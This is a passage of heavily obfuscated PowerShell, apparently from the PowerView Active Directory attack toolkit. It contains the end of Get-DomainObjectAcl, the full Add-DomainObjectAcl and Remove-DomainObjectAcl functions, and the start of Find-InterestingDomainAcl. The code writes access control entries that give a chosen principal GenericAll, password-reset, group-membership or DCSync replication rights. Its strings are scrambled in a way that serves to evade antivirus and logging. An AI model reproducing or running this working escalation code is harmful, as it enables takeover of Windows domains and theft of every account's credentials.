                    &("{1}{2}{0}"-f 'ct','N','ew-Obje') ("{7}{4}{6}{9}{3}{0}{10}{2}{8}{5}{1}"-f'ntr','tor','Securit','Co','curit','rip','y.Acce','Se','yDesc','ss','ol.Raw') -ArgumentList ${oBJ`ect}[("{2}{0}{1}{3}"-f'curityde','scr','ntse','iptor')][0], 0 | &("{1}{0}{2}"-f'Ob','ForEach-','ject') { if (${Ps`BoUND`pARaME`Te`Rs}[("{1}{0}" -f'l','Sac')]) {${_}."s`y`stemacl"} else {${_}."diS`cRetio`N`AR`YaCL"} } | &("{2}{3}{1}{0}"-f'Object','ch-','ForE','a') {
                        if (${pSbou`NDpara`me`TerS}[("{2}{0}{3}{1}" -f'ght','er','Ri','sFilt')]) {
                            ${GuiDF`I`LTer} = Switch (${R`IGhT`sF`iLtER}) {
                                ("{3}{1}{2}{4}{0}" -f 'ord','e','s','R','etPassw') { ("{7}{6}{3}{0}{9}{8}{5}{10}{2}{4}{1}" -f'5','0529','68','9','-00aa006e','a','9','002','d0-','70-246d-11','7') }
                                ("{1}{2}{0}"-f 'teMembers','Wr','i') { ("{1}{5}{2}{7}{8}{4}{6}{0}{3}"-f '0','bf96','c0-0d','3049e2','00aa','79','0','e6-11d','0-a285-') }
                                Default { ("{2}{1}{3}{5}{4}{6}{0}"-f '00','-0','00000000','000-00','000-0000','00-0','000000') }
                            }
                            if (${_}."O`BJEctT`yPe" -eq ${G`U`idFI`LtER}) {
                                ${_} | &("{0}{2}{1}" -f'Add','mber','-Me') ("{1}{0}{2}" -f 'P','Note','roperty') ("{0}{1}" -f 'ObjectD','N') ${obj`ECT}."Dis`Ti`NguishEDna`me"[0]
                                ${_} | &("{0}{1}{2}" -f'Add-','Me','mber') ("{1}{2}{0}"-f 'operty','Not','ePr') ("{2}{1}{0}"-f 'tSID','c','Obje') ${Ob`JE`CTSID}
                                ${cO`NtIN`UE} = ${T`Rue}
                            }
                        }
                        else {
                            ${_} | &("{1}{2}{3}{0}"-f 'Member','A','dd','-') ("{1}{0}{2}{3}" -f'Prope','Note','r','ty') ("{1}{2}{0}"-f'DN','Objec','t') ${objE`ct}."dISTI`NguIsh`ed`NAme"[0]
                            ${_} | &("{0}{2}{1}" -f 'Add','ember','-M') ("{3}{2}{1}{0}" -f'ty','per','Pro','Note') ("{2}{0}{1}"-f'bj','ectSID','O') ${O`Bj`ECtsId}
                            ${Co`NTI`Nue} = ${TR`Ue}
                        }

                        if (${COnT`iNue}) {
                            ${_} | &("{0}{2}{1}"-f'Add-','ber','Mem') ("{0}{2}{1}"-f'NotePr','erty','op') ("{0}{2}{3}{1}{4}"-f'Act','Directo','i','ve','ryRights') ( (GEt-VARIabLE  ("{1}{0}" -f 's5','mn')  -vaLUEon )::"Toob`Je`CT"([System.DirectoryServices.ActiveDirectoryRights], ${_}."AC`CE`SsMaSK"))
                            if (${g`UiDs}) {
                                
                                ${aC`L`pr`OpeR`TiES} = @{}
                                ${_}."pSoB`J`ect"."PR`O`PErti`Es" | &("{1}{2}{0}{3}" -f 'ch-Obj','Fo','rEa','ect') {
                                    if (${_}."na`me" -match ((("{13}{11}{3}{10}{2}{0}{9}{6}{7}{12}{1}{17}{15}{14}{8}{5}{16}{4}"-f'TypeplCObje','her','bject','pe','ceType','t','tAc','eTypeplC','ec','c','plCInheritedO','bjectTy','In','O','dObj','te','A','i'))-cRepLacE ([CHaR]112+[CHaR]108+[CHaR]67),[CHaR]124)) {
                                        try {
                                            ${ac`lpR`o`p`ERTieS}[${_}."na`Me"] = ${gu`IdS}[${_}."VA`LUE".("{0}{1}{2}"-f 'toSt','rin','g').Invoke()]
                                        }
                                        catch {
                                            ${AC`L`Prop`ERTiES}[${_}."Na`Me"] = ${_}."v`ALUE"
                                        }
                                    }
                                    else {
                                        ${acLpRop`ERTi`ES}[${_}."n`AME"] = ${_}."Va`LUe"
                                    }
                                }
                                ${O`U`T`OBJeCT} = &("{2}{1}{0}" -f'bject','ew-O','N') -TypeName ("{0}{1}{2}" -f'P','SObjec','t') -Property ${a`Clp`R`oPertiES}
                                ${O`UTO`B`jEct}."P`sO`BJecT"."TyPEn`AM`ES".("{1}{0}"-f 'ert','Ins').Invoke(0, ("{0}{3}{1}{2}" -f'P','erView','.ACL','ow'))
                                ${ouTO`B`JeCT}
                            }
                            else {
                                ${_}."P`SobJe`CT"."T`yPen`AMEs".("{1}{0}{2}"-f 'nse','I','rt').Invoke(0, ("{0}{1}{2}{3}"-f'Po','w','er','View.ACL'))
                                ${_}
                            }
                        }
                    }
                }
                catch {
                    &("{1}{2}{0}" -f 'Verbose','Writ','e-') ('[G'+'et'+'-Domai'+'nObjectAcl]'+' '+'Er'+'ror: '+"$_")
                }
            }
        }
    }
}


function ad`d-d`OMaino`Bjec`TaCL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{0}{1}{4}{2}"-f 'houl','d','ss','PSS','Proce'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(POSitioN = 0, VaLuEfROmpIPelINe = ${t`RUE}, ValUEfRompiPElINebYpropeRTynAmE = ${tr`UE})]
        [Alias({"{1}{4}{3}{5}{0}{2}"-f'hedNam','D','e','g','istin','uis'}, {"{0}{3}{4}{2}{1}" -f'S','Name','t','a','mAccoun'}, {"{1}{0}"-f'me','Na'})]
        [String[]]
        ${T`A`RgE`T`IdeNtItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${tArGE`T`DO`MA`in},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Filte','r'})]
        [String]
        ${targ`E`Tlda`pf`iLt`eR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Ta`RGE`TseAr`ch`BAsE},

        [Parameter(MANDaTORY = ${Tr`Ue})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${pRiNci`pa`LIDentI`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${PrinC`i`P`ALdOMa`IN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{2}{1}{3}" -f'ma','nContr','i','oller','Do'})]
        [String]
        ${sE`R`VeR},

        [ValidateSet({"{0}{1}"-f 'B','ase'}, {"{1}{2}{0}" -f 'evel','O','neL'}, {"{0}{1}" -f'Subt','ree'})]
        [String]
        ${seA`R`cHs`COpE} = ("{1}{0}"-f'tree','Sub'),

        [ValidateRange(1, 10000)]
        [Int]
        ${reSuLT`p`A`geSIZe} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SEr`VErtIM`eL`ImIT},

        [Switch]
        ${TOm`BsTO`NE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${crED`en`TiAl} =  (Get-VaRIabLe ("{0}{1}" -f 'QF','n') -Valueo)::"EM`pty",

        [ValidateSet('All', {"{1}{0}{3}{2}" -f'se','Re','ssword','tPa'}, {"{2}{0}{1}" -f 'ber','s','WriteMem'}, {"{0}{1}"-f 'DCS','ync'})]
        [String]
        ${RIg`H`Ts} = 'All',

        [Guid]
        ${Ri`g`H`TSguiD}
    )

    BEGIN {
        ${ta`RgeTsEarc`He`RArGUmE`N`TS} = @{
            ("{2}{3}{0}{1}"-f'oper','ties','P','r') = ("{1}{0}{3}{4}{2}"-f'ingu','dist','ame','ish','edn')
            'Raw' = ${t`RuE}
        }
        if (${psBoUnD`P`ARAmE`Ters}[("{0}{3}{2}{1}"-f'Targ','main','Do','et')]) { ${Ta`R`G`eTsEa`RCHe`RaRgU`m`ENTs}[("{0}{1}" -f'D','omain')] = ${tARgetD`OMa`IN} }
        if (${PsBO`UnD`P`A`RamE`TERS}[("{0}{1}{2}{3}" -f 'Target','LDAPF','il','ter')]) { ${TaRGe`T`SE`A`RCHERaRgumEnTs}[("{3}{1}{2}{0}" -f 'lter','PF','i','LDA')] = ${TaRgETl`dApf`I`ltER} }
        if (${PsBoUnd`PARa`M`Et`e`Rs}[("{2}{3}{0}{1}" -f'B','ase','Targ','etSearch')]) { ${TArGEtS`EAR`cHEra`R`GuMeNts}[("{2}{0}{1}" -f'c','hBase','Sear')] = ${Ta`RgeTsE`AR`cHbasE} }
        if (${pSBo`UNDPAra`m`etE`RS}[("{1}{0}" -f'rver','Se')]) { ${tar`ge`TSE`AR`cHeRargumenTs}[("{1}{0}" -f 'rver','Se')] = ${seR`V`ER} }
        if (${psboU`N`dPaRa`MeTE`Rs}[("{2}{0}{1}{3}" -f'rch','Sco','Sea','pe')]) { ${taRgEt`SeARCher`A`R`Gu`MentS}[("{0}{1}{2}" -f 'Sea','rchSc','ope')] = ${sEaRC`hs`Cope} }
        if (${Psb`OUnDPa`Ram`eTERS}[("{2}{1}{0}"-f 'ltPageSize','esu','R')]) { ${TARgeTs`Earc`h`ErArGumen`TS}[("{1}{3}{4}{2}{0}"-f 'e','Res','Siz','u','ltPage')] = ${reS`ULtP`AgEs`IZE} }
        if (${pS`Bo`Undpara`meTeRs}[("{1}{2}{3}{0}"-f 'it','Ser','v','erTimeLim')]) { ${tARgeTSEArC`he`Ra`R`GU`m`e`NTS}[("{3}{0}{1}{2}"-f'erverTi','meLim','it','S')] = ${seRv`E`RTIM`ElIMIt} }
        if (${pS`B`oUN`dpaRaMe`T`erS}[("{0}{2}{1}"-f'To','bstone','m')]) { ${tARG`ETsea`RCHER`ARG`UMen`Ts}[("{1}{2}{0}" -f'tone','T','ombs')] = ${tomb`S`T`ONe} }
        if (${pS`BOUN`d`PA`RaMetErs}[("{1}{0}{2}"-f'denti','Cre','al')]) { ${TaRGeTseaRCh`E`RaRg`UmEn`TS}[("{2}{1}{0}" -f 'al','i','Credent')] = ${cREd`e`NTIAl} }

        ${pR`iNcipA`L`sEarC`h`e`RaRgUMeNtS} = @{
            ("{1}{0}{2}"-f'en','Id','tity') = ${priNC`IP`ALI`DENTity}
            ("{2}{0}{1}" -f 'o','perties','Pr') = ("{4}{1}{2}{5}{3}{0}{6}"-f 'me,objects','ing','u','a','dist','ishedn','id')
        }
        if (${pS`BOUN`DPARA`ME`TErS}[("{2}{4}{0}{1}{3}"-f 'o','m','Principa','ain','lD')]) { ${priN`Ci`PAL`seArCHERArGum`EN`TS}[("{2}{0}{1}" -f'omai','n','D')] = ${Prin`CIpAlD`oMa`iN} }
        if (${PSb`OuNDpaR`AM`eTeRs}[("{0}{1}" -f 'Serve','r')]) { ${pRinCIp`Al`Se`Ar`cHE`RArG`UmeNts}[("{0}{1}" -f'Serve','r')] = ${s`ERvEr} }
        if (${psBO`UN`dPARAM`ETE`RS}[("{2}{1}{0}" -f 'cope','rchS','Sea')]) { ${p`RinCIpal`SE`Ar`Chera`RgUMen`Ts}[("{0}{1}{2}" -f 'SearchS','co','pe')] = ${Searc`HS`cOpE} }
        if (${PSbo`U`NDpA`Ra`MeterS}[("{0}{1}{2}"-f'Res','ultPa','geSize')]) { ${pR`INcip`AlseAr`c`HEr`A`RG`UmENTS}[("{2}{0}{4}{3}{1}" -f'es','ze','R','geSi','ultPa')] = ${R`Es`Ultp`AGesIzE} }
        if (${PsbOunD`PA`Ra`Me`TERs}[("{0}{2}{1}"-f 'Server','t','TimeLimi')]) { ${prI`NCI`pAl`seArCHerargumE`NtS}[("{3}{2}{0}{1}" -f 'Li','mit','verTime','Ser')] = ${SE`R`VertiMelImiT} }
        if (${p`sbo`Un`D`pa`RAmEtERs}[("{2}{0}{1}{3}"-f 'om','b','T','stone')]) { ${p`RInciPa`lSEArCh`E`R`ArgUMEnts}[("{0}{1}{2}" -f'T','ombst','one')] = ${t`OMbstO`Ne} }
        if (${P`SB`OU`NdpaRAM`e`TeRS}[("{1}{2}{0}"-f 'l','Cr','edentia')]) { ${prI`Nci`PALSEAR`c`Her`A`Rg`UmENTS}[("{2}{1}{0}"-f'l','entia','Cred')] = ${c`Rede`NTIal} }
        ${p`RINcIp`A`Ls} = &("{3}{0}{2}{1}" -f '-Domai','bject','nO','Get') @PrincipalSearcherArguments
        if (-not ${PriNCiP`A`lS}) {
            throw ('Un'+'a'+'ble '+'t'+'o '+'r'+'es'+'olve '+'pri'+'n'+'cip'+'al: '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${TarG`ETsea`R`ch`ERAr`gumEnTs}[("{0}{2}{1}" -f 'Ide','y','ntit')] = ${TARGE`T`IdE`NTi`TY}
        ${tARg`eTS} = &("{0}{3}{4}{1}{5}{2}" -f'G','j','ct','et','-DomainOb','e') @TargetSearcherArguments

        ForEach (${T`Ar`g`e`TOBJeCt} in ${TA`RgETS}) {

            ${INHERi`TAN`C`E`TyPE} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{1}{0}"-f 'e','Non')
            ${c`onTR`OltypE} = [System.Security.AccessControl.AccessControlType] ("{0}{1}"-f 'A','llow')
            ${aC`es} = @()

            if (${ri`gH`T`SgUid}) {
                ${Gui`ds} = @(${RIgHT`sgU`id})
            }
            else {
                ${gUi`dS} = Switch (${R`I`ghts}) {
                    
                    ("{1}{0}{2}"-f't','Rese','Password') { ("{1}{3}{2}{4}{6}{0}{5}" -f '-a768-00aa0','002995','0-246d','7','-','06e0529','11d0') }
                    
                    ("{0}{3}{2}{1}" -f 'Wr','rs','Membe','ite') { ("{3}{7}{1}{4}{6}{2}{5}{9}{8}{0}" -f 'e2','1d','a','bf9679c','0-a285-','a0','00','0-0de6-1','049','03') }
                    
                    
                    
                    
                    ("{1}{0}"-f 'Sync','DC') { ("{10}{5}{2}{1}{7}{3}{9}{8}{6}{4}{0}"-f'2dcd2','a-9c0','a','1-','c','31f6','04f','7-11d','c','f79f-00','11'), ("{3}{2}{0}{4}{1}{5}{6}"-f 'f6ad-9c0','-00c0','131','1','7-11d1-f79f','4fc2d','cd2'), ("{1}{7}{5}{6}{8}{2}{3}{0}{10}{4}{9}" -f'a-','8','d-4c62-99','1','40','7','6','9e95b','-444','c','0facbeda6')}
                }
            }

            ForEach (${prin`CIpaLOBJE`cT} in ${PRINCi`P`AlS}) {
                &("{0}{1}{2}" -f'Writ','e-V','erbose') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) "

                try {
                    ${i`d`eNtItY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${pr`inCi`p`ALObJeCT}."oBJ`E`CTS`iD")

                    if (${g`UI`DS}) {
                        ForEach (${Gu`id} in ${g`UI`dS}) {
                            ${NEw`g`UiD} = &("{0}{1}{2}"-f'Ne','w','-Object') ("{0}{1}" -f'Gu','id') ${g`UId}
                            ${adR`IgH`Ts} = [System.DirectoryServices.ActiveDirectoryRights] ("{4}{3}{0}{1}{2}"-f'ed','Rig','ht','end','Ext')
                            ${ac`Es} += &("{0}{2}{1}"-f'New','ect','-Obj') ("{8}{3}{5}{7}{9}{4}{2}{6}{1}{0}{10}" -f 'ectoryAcce','r','D','tem.Direc','ve','toryS','i','ervic','Sys','es.Acti','ssRule') ${I`de`NtitY}, ${A`DRIG`hts}, ${CONTrolt`y`Pe}, ${n`ewgu`ID}, ${i`NHErItA`Nc`et`yPE}
                        }
                    }
                    else {
                        
                        ${Ad`RiG`HTs} = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{1}{0}" -f'l','Al','Generic')
                        ${a`CEs} += &("{2}{1}{0}" -f 'ct','ew-Obje','N') ("{6}{0}{4}{2}{7}{5}{1}{8}{3}" -f 'em.DirectoryS','ect','rvi','le','e','ir','Syst','ces.ActiveD','oryAccessRu') ${IdE`N`TiTy}, ${ADriG`h`TS}, ${Co`NTR`o`Ltype}, ${i`Nh`er`Ita`NcetYpE}
                    }

                    
                    ForEach (${A`CE} in ${Ac`ES}) {
                        &("{0}{1}{2}"-f'Wr','ite','-Verbose') "[Add-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${tARGe`TEn`TRY} = ${ta`RG`eTObJeCt}.("{1}{2}{3}{0}"-f'try','GetDi','re','ctoryEn').Invoke()
                        ${ta`RgEt`ent`Ry}."psB`AsE"."oP`TIoNs"."sECUr`i`TymaSkS" = ("{0}{1}"-f'D','acl')
                        ${ta`Rg`eTeNT`Ry}."Psba`Se"."Ob`J`EctsECu`R`ItY".("{0}{4}{2}{1}{3}"-f'Ad','Rul','cess','e','dAc').Invoke(${a`CE})
                        ${taRg`eT`EnTRY}."psBa`se".("{2}{0}{1}" -f 'Chang','es','Commit').Invoke()
                    }
                }
                catch {
                    &("{2}{1}{3}{0}" -f 'e','o','Write-Verb','s') "[Add-DomainObjectAcl] Error granting principal $($PrincipalObject.distinguishedname) '$Rights' on $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function rEMove`-dom`AINO`BjECta`cl {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{4}{2}" -f'o','Pr','ess','PSShould','c'}, '')]
    [CmdletBinding()]
    Param (
        [Parameter(pOSItION = 0, vAlUeFROmPIPeLiNe = ${TR`UE}, valUEfromPIPEliNEBypropERTYNAme = ${tr`UE})]
        [Alias({"{3}{2}{1}{0}" -f 'me','edNa','ish','Distingu'}, {"{2}{3}{1}{0}{4}"-f 'untN','cco','S','amA','ame'}, {"{1}{0}"-f 'me','Na'})]
        [String[]]
        ${TaRg`etiDe`NTI`TY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${Ta`RG`EtD`OMAin},

        [ValidateNotNullOrEmpty()]
        [Alias({"{1}{0}"-f 'er','Filt'})]
        [String]
        ${T`ArGetld`AP`F`ILTeR},

        [ValidateNotNullOrEmpty()]
        [String]
        ${targEt`sEAR`C`hBasE},

        [Parameter(ManDATOry = ${tR`Ue})]
        [ValidateNotNullOrEmpty()]
        [String[]]
        ${PrI`NC`IPal`iDe`NtItY},

        [ValidateNotNullOrEmpty()]
        [String]
        ${PRiNC`Ip`AldO`m`AIN},

        [ValidateNotNullOrEmpty()]
        [Alias({"{4}{0}{1}{3}{2}"-f 'om','a','oller','inContr','D'})]
        [String]
        ${s`erVeR},

        [ValidateSet({"{0}{1}" -f'B','ase'}, {"{0}{1}"-f'O','neLevel'}, {"{2}{0}{1}"-f 'bt','ree','Su'})]
        [String]
        ${S`e`ARc`hSCope} = ("{1}{0}" -f 'e','Subtre'),

        [ValidateRange(1, 10000)]
        [Int]
        ${rESUl`T`P`AgEsize} = 200,

        [ValidateRange(1, 10000)]
        [Int]
        ${SeR`VE`RT`i`MeLiMiT},

        [Switch]
        ${toMb`s`TOnE},

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        ${cREDEnt`I`Al} =   (ls  ("vA"+"r"+"iaBle:qfN"))."vA`lUE"::"eMP`TY",

        [ValidateSet('All', {"{4}{3}{0}{1}{2}"-f 'o','r','d','setPassw','Re'}, {"{2}{1}{0}" -f 'bers','iteMem','Wr'}, {"{2}{0}{1}" -f'CS','ync','D'})]
        [String]
        ${rig`HTs} = 'All',

        [Guid]
        ${rIG`htsg`U`iD}
    )

    BEGIN {
        ${t`ArGetsea`Rc`hERArGUMe`NtS} = @{
            ("{0}{2}{1}"-f'Prope','ties','r') = ("{2}{1}{0}{3}"-f'tinguishedna','is','d','me')
            'Raw' = ${T`RUE}
        }
        if (${PsBoUN`dp`Ar`AM`eTERs}[("{2}{1}{0}" -f 'tDomain','rge','Ta')]) { ${TargEt`Se`ARcHeraRgu`M`E`NtS}[("{2}{1}{0}" -f'main','o','D')] = ${tarG`ET`D`O`mAIn} }
        if (${pSbOunDPARA`M`Et`E`RS}[("{4}{3}{2}{0}{1}" -f'Fil','ter','etLDAP','g','Tar')]) { ${T`ArgE`TseAR`cher`Ar`g`UmEnts}[("{0}{1}{2}" -f'LDAP','Filt','er')] = ${TARg`ETLDApf`ilT`Er} }
        if (${pS`BoUnD`PAram`Et`ErS}[("{2}{1}{4}{0}{3}" -f's','SearchB','Target','e','a')]) { ${TaRGEtSe`A`RCHe`RAR`GU`menTS}[("{1}{2}{0}"-f 'Base','Sear','ch')] = ${TAR`G`ETSEArchb`A`se} }
        if (${p`sbO`UndpArAmeT`ERS}[("{0}{1}"-f 'Ser','ver')]) { ${ta`RGETsEa`RC`he`R`ArguMe`NTs}[("{1}{0}{2}"-f 'r','Se','ver')] = ${SE`RVER} }
        if (${pSbOu`N`dpAr`AME`TERs}[("{2}{0}{1}" -f 'Sc','ope','Search')]) { ${tAR`ge`T`s`eArCHe`RArguMe`NtS}[("{2}{1}{0}" -f'e','archScop','Se')] = ${s`earCHsc`oPe} }
        if (${pSbOuN`DP`A`RAM`E`TerS}[("{0}{1}{2}"-f 'Resu','ltPa','geSize')]) { ${TaRgEt`seArCHE`RA`RG`UM`eNtS}[("{1}{0}{3}{2}" -f't','Resul','e','PageSiz')] = ${rEs`Ult`PA`GE`Size} }
        if (${psb`OUN`d`P`ArAMeTeRs}[("{3}{2}{0}{4}{1}"-f 'erTim','t','rv','Se','eLimi')]) { ${tARG`eTseaR`ChER`A`RgUm`EN`Ts}[("{3}{1}{4}{2}{0}" -f 't','TimeLi','i','Server','m')] = ${serve`R`TImEl`IM`It} }
        if (${PSBounD`paR`A`MEt`ERs}[("{1}{0}{2}"-f 'on','Tombst','e')]) { ${tARGEtSEARc`he`R`ArGU`MeNTS}[("{0}{2}{1}"-f 'Tom','ne','bsto')] = ${Tom`Bs`TOne} }
        if (${PsboUnDPar`A`M`eTe`Rs}[("{2}{1}{0}" -f 'al','redenti','C')]) { ${T`A`R`getseArcheRARg`U`ME`NTS}[("{2}{0}{1}"-f'ent','ial','Cred')] = ${C`Re`deNTI`AL} }

        ${prinC`I`PAlSe`A`RCHErARgum`eNTs} = @{
            ("{0}{1}" -f'Identit','y') = ${princiPA`LI`DeN`T`itY}
            ("{1}{0}{2}" -f'op','Pr','erties') = ("{4}{2}{5}{1}{0}{3}" -f'name,object','ed','gui','sid','distin','sh')
        }
        if (${psbOuND`P`A`Ra`ME`Ters}[("{3}{4}{2}{0}{1}"-f 'palD','omain','i','Prin','c')]) { ${PR`I`NC`IPaLSear`ChERARgu`me`N`Ts}[("{1}{0}{2}"-f 'i','Doma','n')] = ${prinCi`PAlD`O`m`AiN} }
        if (${pSboun`dpaRAm`E`TeRs}[("{0}{1}"-f'Serv','er')]) { ${pRIN`ci`PAlsear`ChER`ARgum`eN`Ts}[("{1}{0}"-f'erver','S')] = ${SE`RV`ER} }
        if (${pSB`ouND`PaRaM`et`Ers}[("{0}{3}{1}{2}" -f'Se','S','cope','arch')]) { ${p`Ri`Ncip`AlSeAR`Ch`erAR`G`UM`Ents}[("{3}{2}{0}{1}" -f'rc','hScope','a','Se')] = ${se`A`Rch`scOPe} }
        if (${P`s`Bou`NDp`ARAMEtErs}[("{0}{1}{3}{2}" -f 'Res','u','PageSize','lt')]) { ${p`RINcIpAlseARc`He`RArgume`N`Ts}[("{3}{0}{2}{1}"-f'esu','geSize','ltPa','R')] = ${reS`UL`T`PAgesiZE} }
        if (${psBoU`Ndp`AraMeTE`Rs}[("{2}{1}{0}" -f'rTimeLimit','ve','Ser')]) { ${PrINci`PaL`SEArCHERA`Rg`Um`eNTs}[("{0}{1}{3}{2}"-f'Serve','rT','mit','imeLi')] = ${SERvE`RtImELi`mIt} }
        if (${ps`BoundPARA`m`EterS}[("{2}{0}{1}" -f 't','one','Tombs')]) { ${p`RINCiP`AL`Sea`R`CH`eR`Arg`UMENTS}[("{3}{2}{1}{0}"-f'e','ston','mb','To')] = ${tOmBs`T`ONe} }
        if (${Psb`OuND`PA`RA`Me`TErs}[("{1}{2}{3}{0}" -f'al','Cr','ed','enti')]) { ${prIn`c`IPA`lseaRC`H`eRA`Rg`UmeN`TS}[("{2}{0}{1}" -f'eden','tial','Cr')] = ${crEdENt`i`Al} }
        ${PrI`N`CIPALs} = &("{1}{2}{0}"-f'ect','Get-DomainO','bj') @PrincipalSearcherArguments
        if (-not ${p`Rincip`ALS}) {
            throw ('Unabl'+'e '+'to'+' '+'re'+'so'+'lve '+'principa'+'l:'+' '+"$PrincipalIdentity")
        }
    }

    PROCESS {
        ${ta`R`GeT`seaRch`E`RaRG`Um`ENTS}[("{0}{1}{2}" -f 'Id','enti','ty')] = ${t`A`RgETI`denTI`Ty}
        ${t`ArG`etS} = &("{3}{2}{1}{0}" -f'ct','bje','ainO','Get-Dom') @TargetSearcherArguments

        ForEach (${t`ARG`Eto`BJeCT} in ${T`ARGE`Ts}) {

            ${inheR`ITAnc`eTy`Pe} = [System.DirectoryServices.ActiveDirectorySecurityInheritance] ("{0}{1}" -f'No','ne')
            ${COn`T`ROltYpE} = [System.Security.AccessControl.AccessControlType] ("{0}{1}" -f 'A','llow')
            ${A`CES} = @()

            if (${R`igHTs`G`UID}) {
                ${gui`dS} = @(${rig`htSg`UID})
            }
            else {
                ${G`UiDS} = Switch (${r`ig`HTs}) {
                    
                    ("{0}{4}{2}{3}{1}"-f'Res','d','tPas','swor','e') { ("{2}{1}{5}{4}{3}{8}{0}{7}{6}{9}" -f '0','2','00','1d0-a768','6d-1','99570-24','0','0aa','-','06e0529') }
                    
                    ("{2}{0}{1}"-f 'eM','embers','Writ') { ("{5}{2}{6}{7}{4}{8}{3}{0}{1}"-f '304','9e2','96','a285-00aa00','6-11d0','bf','79c0','-0de','-') }
                    
                    
                    
                    
                    ("{1}{0}{2}"-f'CSyn','D','c') { ("{2}{5}{7}{1}{4}{8}{6}{3}{0}"-f 'c2dcd2','aa-9c07-1','1','c04f','1','131','9f-00','f6','d1-f7'), ("{2}{0}{1}{5}{6}{4}{3}{7}"-f '6ad','-9c07-11','1131f','2dc','c04fc','d1-f7','9f-00','d2'), ("{9}{6}{7}{0}{3}{2}{1}{8}{4}{5}" -f '4c62-','cbe','a-0fa','991','0','c','e95b7','6-444d-','da64','89')}
                }
            }

            ForEach (${priNC`IP`A`Lobj`eCT} in ${PRIN`cI`pals}) {
                &("{0}{2}{3}{1}"-f'Wr','bose','it','e-Ver') "[Remove-DomainObjectAcl] Removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) "

                try {
                    ${iDeNt`iTY} = [System.Security.Principal.IdentityReference] ([System.Security.Principal.SecurityIdentifier]${p`R`I`NcipALobjEct}."OB`j`EcTSId")

                    if (${gUi`Ds}) {
                        ForEach (${g`UID} in ${gu`iDS}) {
                            ${nE`wGUID} = &("{1}{0}{2}"-f '-O','New','bject') ("{0}{1}" -f'Gui','d') ${Gu`id}
                            ${ADr`IgHts} = [System.DirectoryServices.ActiveDirectoryRights] ("{1}{3}{0}{2}"-f'Righ','Exten','t','ded')
                            ${Ac`ES} += &("{0}{1}{2}" -f 'N','e','w-Object') ("{8}{4}{2}{0}{1}{9}{6}{11}{5}{10}{3}{7}"-f'Ac','tiveD','ces.','Ru','em.DirectoryServi','Ac','ctor','le','Syst','ire','cess','y') ${I`d`EnTItY}, ${AdrIg`H`Ts}, ${C`Ontr`Ol`TyPE}, ${Ne`wGU`Id}, ${InhE`RITanCE`Ty`PE}
                        }
                    }
                    else {
                        
                        ${AdrI`gH`TS} = [System.DirectoryServices.ActiveDirectoryRights] ("{2}{0}{1}{3}" -f'ri','c','Gene','All')
                        ${A`CEs} += &("{2}{3}{1}{0}" -f'ct','bje','New','-O') ("{5}{2}{11}{4}{1}{7}{6}{3}{12}{13}{10}{14}{8}{0}{9}"-f'oryAcce','Ser','D','Ac','tory','System.','ces.','vi','ect','ssRule','v','irec','t','i','eDir') ${iDEN`T`Ity}, ${a`DRIGhtS}, ${cOnt`R`Olt`YPE}, ${InHErItAN`c`E`TYPE}
                    }

                    
                    ForEach (${a`CE} in ${a`Ces}) {
                        &("{1}{0}{2}" -f 'e-V','Writ','erbose') "[Remove-DomainObjectAcl] Granting principal $($PrincipalObject.distinguishedname) rights GUID '$($ACE.ObjectType)' on $($TargetObject.Properties.distinguishedname) "
                        ${TaRG`ETen`TrY} = ${tAR`gET`oBj`eCT}.("{1}{4}{3}{0}{2}"-f 'tory','GetDir','Entry','c','e').Invoke()
                        ${TarG`e`Tent`RY}."P`SBAse"."Op`TI`oNS"."SEcURIT`Yma`skS" = ("{0}{1}"-f'D','acl')
                        ${TarGe`Te`Nt`RY}."pSB`Ase"."o`BJecTs`eCu`R`ItY".("{0}{2}{1}" -f'Remov','e','eAccessRul').Invoke(${A`cE})
                        ${taR`GET`Ent`Ry}."P`S`BAse".("{2}{0}{4}{1}{3}" -f 'm','Chan','Co','ges','mit').Invoke()
                    }
                }
                catch {
                    &("{3}{4}{0}{1}{2}"-f'-','Verbos','e','Wr','ite') "[Remove-DomainObjectAcl] Error removing principal $($PrincipalObject.distinguishedname) '$Rights' from $($TargetObject.Properties.distinguishedname) : $_ "
                }
            }
        }
    }
}


function fI`N`d-INt`EReStINgD`O`maIN`ACL {


    [Diagnostics.CodeAnalysis.SuppressMessageAttribute({"{3}{1}{0}{2}{4}" -f'e','ouldProc','s','PSSh','s'}, '')]
    [OutputType({"{1}{3}{2}{0}" -f 'ACL','PowerV','w.','ie'})]
    [CmdletBinding()]
    Param (
        [Parameter(positiON = 0, VAluEfRomPIPeliNe = ${t`RUe}, VaLUefromPIPeLiNEbypRoPeRTYname = ${T`Rue})]
        [Alias({"{2}{0}{1}{3}" -f'o','mai','D','nName'}, {"{1}{0}"-f'e','Nam'})]
        [String]
        ${D`OmAIn},

        [Switch]
        ${R`EsO`LVEgU`Ids},

        [String]
        [ValidateSet('All', {"{2}{1}{0}"-f'Password','eset','R'}, {"{2}{0}{1}"-f't','eMembers','Wri'})]
        ${RiGht`s`FiLteR},

        [ValidateNotNullOrEmpty()]
        [Alias({"{0}{1}"-f'Filte','r'})]
        [String]
        ${Ldap`Fi`lTER},

        [ValidateNotNullOrEmpty()]
